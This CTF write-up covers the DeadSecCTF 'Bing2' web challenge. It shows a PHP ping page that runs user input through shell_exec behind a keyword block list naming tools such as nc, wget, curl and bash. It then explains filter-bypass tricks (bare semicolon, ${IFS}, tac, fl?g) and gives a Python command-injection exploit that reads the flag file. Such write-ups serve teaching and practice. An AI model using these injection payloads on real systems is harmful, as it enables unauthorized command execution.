# Web/Bing2

## Description

Attachments: [Bing2.zip](./Bing2.zip)

## Challenge Overview

In this challenge we were given a simple website that served a static page. Checking the source code we find that we can also access `/bing.php`.

bing.php

```php
<?php

if (isset($_POST['Submit'])) {
	$target = trim($_REQUEST['ip']);

	$substitutions = array(
		' ' => '',
		'&'  => '',
		'&&' => '',
		'('  => '',
		')'  => '',
		'-'  => '',
		'`'  => '',
		'|' => '',
		'||' => '',
		'; ' => '',	
		'%' => '',
		'~' => '',
		'<' => '',
		'>' => '',
		'/ ' => '',
		'\\' => '',
		'ls' => '',
        'cat' => '',
        'less' => '',
        'tail' => '',
        'more' => '',
        'whoami' => '',
        'pwd' => '',
        'busybox' => '',
        'nc' => '',
        'exec' => '',
        'sh' => '',
        'bash' => '',
        'php' => '',
        'perl' => '',
        'python' => '',
        'ruby' => '',
        'java' => '',
        'javac' => '',
        'gcc' => '',
        'g++' => '',
        'make' => '',
        'cmake' => '',
        'nmap' => '',
        'wget' => '',
        'curl' => '',
        'scp' => '',
        'ssh' => '',
        'ftp' => '',
        'telnet' => '',
        'dig' => '',
        'nslookup' => '',
        'iptables' => '',
        'chmod' => '',
        'chown' => '',
        'chgrp' => '',
        'kill' => '',
        'killall' => '',
        'service' => '',
        'systemctl' => '',
        'sudo' => '',
        'su' => '',
        'flag' => '',
	);

	$target = str_replace(array_keys($substitutions), $substitutions, $target);

	if (stristr(php_uname('s'), 'Windows NT')) {
		$cmd = shell_exec('ping  ' . $target);
	} else {
		$cmd = shell_exec('ping  -c 4 ' . (string)$target);
        echo $cmd;
		
	}
}
```

This is a simple program. It looks for the `ip` data in our `POST` request and then filters various shell commands in order to prevent us from being able to execute command. And once its done with the filters it pings our given ip using `$cmd = shell_exec('ping  -c 4 ' . (string)$target);`. 

We had to find a way to bypass the filters. If you notice carefully, the filter checks for `; ` instead of `;` (notice the space). Which means `;` would not be detected by the filter, thus we can use to execute our commands. 

It is also filtering out spaces for which we can easily bypass using `${IFS}`.

Now, in order to read the flag we need to use something like `cat` but that is also blocked. We can use another command called `tac` here which was not blocked (there must be many other commands, I found this one when I was going through the previous year web challenges of DeadSecCTF [here](https://www.youtube.com/watch?v=G05F5YCiNYM)).

And for bypassing the `flag` filter we can replace it with `fl?g` which will also still print the flag for us.

## Exploit

Thus we can get the flag using this exploit.

exploit.py

```py
import requests

baseURL = "" # Your instance URL here (like https://01189cd339ea3f516f735c83.deadsec.quest)
def bing(cmd):
    url =  baseURL + '/bing.php'
    sendData = {"ip": cmd, "Submit": "Submitted"}
    r = requests.post(url, data=sendData)
    return r

exploit = ";${IFS}tac${IFS}/fl?g.txt"
print(bing(exploit).text)
```